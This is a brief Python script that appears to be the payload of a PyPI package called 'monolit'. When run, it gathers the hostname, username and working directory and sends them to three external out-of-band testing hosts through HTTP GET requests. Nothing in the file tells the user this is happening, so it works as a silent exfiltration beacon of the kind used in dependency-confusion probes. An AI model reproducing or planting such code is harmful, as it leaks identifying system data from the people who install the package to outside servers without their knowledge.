import platform
import getpass
import os
import urllib
import logging
import random

def main():
    hostname = platform.node()
    username = getpass.getuser()
    current_path = os.getcwd()
    rd_num = random.randint(10000, 99999)
    urls = [
        "http://dnipqouebm-psl.cn.oast-cn.byted-dast.com",
        "http://oqvignkp58-psl.i18n.oast-row.byted-dast.com",
        "http://sbfwstspuutiarcjzptfenn9u0dsxhjlu.oast.fun"
    ]

    for url in urls:
        params = {
            "package": "monolit",
            "hostname": hostname,
            "username": username,
            "dir": current_path
        }
        full_url = f"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}"
        try:
            with urllib.request.urlopen(full_url) as response:
                logging.info(response.read().decode())
        except Exception as e:
            logging.error(f"Could not reach {url}: {e}")


if __name__ == "__main__":
    main()